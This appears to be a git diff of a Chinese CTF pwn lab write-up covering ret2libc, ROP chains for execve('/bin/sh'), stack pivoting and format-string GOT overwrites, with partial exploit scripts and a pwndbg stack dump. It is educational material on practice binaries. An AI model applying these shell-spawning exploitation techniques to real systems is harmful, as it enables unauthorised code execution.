@@ -91,7 +91,7 @@
 
 ### lab1-sysmagic
 
-一个很简单的逆向题，看get_flag函数的逻辑逆回来即可，直接逆向的方法就不说了
+一个很简单的逆向题，看get\_flag函数的逻辑逆回来即可，直接逆向的方法就不说了
 
 或者经过观察，flag的生成与输入无关，因此可以通过patch或者调试直接获得flag
 
@@ -111,7 +111,7 @@
 
 直接写出gdb脚本
 
-```python
+```bash
 lab1 [master●●] cat solve 
 b *get_flag+389
 r
@@ -187,11 +187,13 @@ lab3 [master●●]
 
 ![](http://ww1.sinaimg.cn/large/006AWYXBly1fpcpljuki5j30g702wdfy.jpg)
 
+也可以通过 peda 的 pattern\_offset/pattern\_search , pwntools 的 cyclic/cyclic -l 等工具来找 offset 
+
 
 
 ### lab4-ret2lib
 
-ret2libc，并且程序中已经有了一个可以查看got表中值的函数See_something，直接leak出libcBase，通过one_gadget或者system("/bin/sh")都可以get shell，/bin/sh可以使用libc中的字符串，可以通过read读入到内存中，也可以使用binary中的字符串
+ret2libc，并且程序中已经有了一个可以查看got表中值的函数See\_something，直接leak出libcBase，通过one\_gadget或者system("/bin/sh")都可以get shell，/bin/sh可以使用libc中的字符串，可以通过read读入到内存中，也可以使用binary中的字符串
 
 ```python
 lab4 [master●●] cat solve.py 
@@ -223,7 +225,7 @@ lab4 [master●●]
 
 ### lab5-simplerop
 
-本来看程序是静态链接的，想通过ROPgadget/ropper等工具生成的ropchain一波带走，但实际操作时发现read函数只允许读入100个字符，去除buf到main函数返回地址的偏移为32，我们一共有100 - 32 = 68的长度来构造ropchain，而ropper/ROPgadget等自动生成的ropchain都大于这个长度，这就需要我们精心设计ropchain了，这里偷个懒，优化一下ropper生成的ropchain来缩短长度
+本来看程序是静态链接的，想通过 ROPgadget/ropper 等工具生成的 ropchain 一波带走，但实际操作时发现 read 函数只允许读入100个字符，去除 buf 到 main 函数返回地址的偏移为 32，我们一共有 100 - 32 = 68 的长度来构造 ropchain，而 ropper/ROPgadget 等自动生成的 ropchain 都大于这个长度，这就需要我们精心设计 ropchain 了，这里偷个懒，优化一下 ropper 生成的 ropchain 来缩短长度
 
 > ropper --file ./simplerop --chain "execve cmd=/bin/sh"
 >
@@ -271,9 +273,9 @@ print rop
 [INFO] rop chain generated!
 ```
 
-简单介绍一下原理，通过一系列pop|ret等gadget，使得eax = 0xb（execve 32位下的系统调用号），ebx -> /bin/sh， ecx = edx = 0，然后通过int 0x80实现系统调用，执行execve("/bin/sh", 0, 0)，hackme.inndy上也有一道类似的题目[**ROP2**](http://www.cnblogs.com/WangAoBo/p/7706719.html#_label3)
+简单介绍一下原理，通过一系列 pop|ret 等gadget，使得 eax = 0xb（execve 32 位下的系统调用号），ebx -> /bin/sh， ecx = edx = 0，然后通过 `int 0x80` 实现系统调用，执行 execve("/bin/sh", 0, 0)，hackme.inndy 上也有一道类似的题目[**ROP2**](http://www.cnblogs.com/WangAoBo/p/7706719.html#_label3)
 
-而当观察ropper等工具自动生成的ropchain时，会发现有很多步骤很繁琐的，可以做出很多优化，给一个优化后的例子
+而当观察 ropper 等工具自动生成的 ropchain 时，会发现有很多步骤很繁琐的，可以做出很多优化，给一个优化后的例子
 
 ```python
 #!/usr/bin/env python
@@ -328,9 +330,9 @@ rop += rebase_0(0x00026ef0) # 0x0806eef0: int 0x80; ret;
 asset len(rop) <= 100 - 32
 ```
 
-注释都已经写在代码里了，主要优化了将/bin/sh\x00读入以及设置ebx，ecx，edx等寄存器的过程
+注释都已经写在代码里了，主要优化了将 /bin/sh\x00 读入以及设置 ebx，ecx，edx 等寄存器的过程
 
-> 或者直接return到read函数，将/bin/sh\x00 read到bss/data段，能得到更短的ropchain
+> 或者直接 return 到 read 函数，将 /bin/sh\x00 read 到 bss/data 段，能得到更短的 ropchain, 解决方法有很多,不再细说
 
 最终脚本:
 
@@ -403,7 +405,7 @@ io.close()
 
  栈迁移的问题，可以看出这个题目比起暴力的栈溢出做了两点限制：
 
-- 每次溢出只有0x40-0x28-0x4=**20**个字节的长度可以构造ropchain
+- 每次溢出只有 0x40-0x28-0x4=**20** 个字节的长度可以构造 ropchain
 
 - 通过
 
@@ -414,7 +416,7 @@ io.close()
 
   限制了我们只能利用一次main函数的溢出（直接控制main返回到exit后的话，程序的栈结构会乱掉）
 
-所以我们就只能通过20个字节的ropchain来进行rop了，关于栈迁移（又称为stack-pivot）可以看这个[**slide**](https://github.com/M4xW4n9/slides/blob/master/pwn_stack/DEP%20%26%20ROP.pdf%0A)
+所以我们就只能通过 20 个字节的 ropchain 来进行 rop 了，关于栈迁移（又称为 stack-pivot）可以看这个 [**slide**](https://github.com/M4xW4n9/slides/blob/master/pwn_stack/DEP%20%26%20ROP.pdf%0A)
 
 ![stackPivot](https://raw.githubusercontent.com/M4xW4n9/slides/master/pwn_stack/stackPivot.jpg)
 
@@ -473,7 +475,7 @@ io.close()
 
 稍微解释一下，先通过主函数中可以控制的20个字节将esp指针劫持到可控的bss段，然后就可以为所欲为了。
 
-关于stack-pivot，pwnable.kr的simple_login是很经典的题目，放上一篇这道题的很不错的[**wp**](https://blog.csdn.net/yuanyunfeng3/article/details/51456049)
+关于stack-pivot，pwnable.kr的simple\_login是很经典的题目，放上一篇这道题的很不错的[**wp**](https://blog.csdn.net/yuanyunfeng3/article/details/51456049)
 
 这个还有个问题，sendline会gg，send就可以，在atum大佬的[**博客**](http://atum.li/2016/09/20/ctf-strange/)上找到了原因
 
@@ -536,7 +538,7 @@ io.interactive()
 io.close()
 ```
 
-32位的binary可以直接使用pwntools封装好的**fmtstr_payload**函数：
+32位的binary可以直接使用pwntools封装好的**fmtstr\_payload**函数：
 
 ![](http://ww1.sinaimg.cn/large/006AWYXBly1fq2zoc31gjj30om0p3jv2.jpg)
 
@@ -567,9 +569,46 @@ io.interactive()
 io.close()
 ```
 
-如果想要自己实现fmtstr_payload功能，可以参考这篇[**文章**](https://paper.seebug.org/246/)
+如果想要自己实现fmtstr\_payload功能，可以参考这篇[**文章**](https://paper.seebug.org/246/)
 
-### lab9-playfmt	
+### lab9-playfmt
+
+和上一道题相比, lab9 的格式化字符串不在栈上,在全部变量(.bss)段, 因此我们就不能直接控制栈上的变量来进行修改got等行为,但可以通过控制
+```assembly
+Breakpoint *do_fmt+64
+pwndbg> stack 25
+00:0000│ esp  0xffffd0c0 —▸ 0x804a060 (buf) ◂— 0xa7025 /* '%p\n' */
+01:0004│      0xffffd0c4 —▸ 0x8048640 ◂— jno    0x80486b7 /* 'quit' */
+02:0008│      0xffffd0c8 ◂— 0x4
+03:000c│      0xffffd0cc —▸ 0x804857c (play+51) ◂— add    esp, 0x10
+04:0010│      0xffffd0d0 —▸ 0x8048645 ◂— cmp    eax, 0x3d3d3d3d
+05:0014│      0xffffd0d4 —▸ 0xf7fa4000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
+06:0018│ ebp  0xffffd0d8 —▸ 0xffffd0e8 —▸ 0xffffd0f8 ◂— 0x0
+07:001c│      0xffffd0dc —▸ 0x8048584 (play+59) ◂— nop    
+08:0020│      0xffffd0e0 —▸ 0xf7fa4d60 (_IO_2_1_stdout_) ◂— 0xfbad2887
+09:0024│      0xffffd0e4 ◂— 0x0
+0a:0028│      0xffffd0e8 —▸ 0xffffd0f8 ◂— 0x0
+0b:002c│      0xffffd0ec —▸ 0x80485b1 (main+42) ◂— nop    
+0c:0030│      0xffffd0f0 —▸ 0xf7fa43dc (__exit_funcs) —▸ 0xf7fa51e0 (initial) ◂— 0x0
+0d:0034│      0xffffd0f4 —▸ 0xffffd110 ◂— 0x1
+0e:0038│      0xffffd0f8 ◂— 0x0
+0f:003c│      0xffffd0fc —▸ 0xf7e09276 (__libc_start_main+246) ◂— add    esp, 0x10
+10:0040│      0xffffd100 ◂— 0x1
+11:0044│      0xffffd104 —▸ 0xf7fa4000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
+12:0048│      0xffffd108 ◂— 0x0
+13:004c│      0xffffd10c —▸ 0xf7e09276 (__libc_start_main+246) ◂— add    esp, 0x10
+14:0050│      0xffffd110 ◂— 0x1
+15:0054│      0xffffd114 —▸ 0xffffd1a4 —▸ 0xffffd342 ◂— 0x6d6f682f ('/hom')
+16:0058│      0xffffd118 —▸ 0xffffd1ac —▸ 0xffffd375 ◂— 0x5f474458 ('XDG_')
+17:005c│      0xffffd11c ◂— 0x0
+... ↓
+pwndbg> 
+```
+如上 0x15, 0x16, 0x06 出的指针指向栈上的变量, 如修改 0x15 处为
+```assembly
+15:0054│      0xffffd114 —▸ 0xffffd1a4 —▸ 0xffffd0dc —▸ 0x8048584 (play+59)
+```
+然后再将 0x8048584 修改为某个 got 地址, 就可以实现间接地写 got 了, 这种方式也基本成了一种固定的套路, 如 hackme.inndy 的 [echo3](https://github.com/0x01f/pwn_repo/tree/master/inndy_echo3) 一道题
 
 ### lab10-hacknote
 
